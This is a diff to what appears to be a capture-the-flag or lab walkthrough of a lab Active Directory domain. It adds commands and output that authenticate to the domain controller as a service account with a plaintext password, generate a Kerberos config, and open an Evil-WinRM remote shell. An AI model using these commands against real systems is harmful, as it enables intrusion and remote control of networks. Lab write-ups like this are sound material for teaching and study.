@@ -581,7 +581,7 @@ SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following
 To make things easier ill generate a TGT for the user 
 
 
-
+## Evil-winrm as `ldap_svc` on `dc.ext.darkhaven.local`
 ```python
 nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k --generate-krb5-file krb5.conf
 SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
@@ -590,6 +590,20 @@ SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following
 SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
 ```
 
-```python
 
+```python
+sudo cp krb5.conf /etc/krb5.conf
+```
+
+```python
+KRB5CCNAME=ldap_svc.ccache evil-winrm -i dc.ext.darkhaven.local -r ext.darkhaven.local 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ldap_svc\Documents> 
 ```
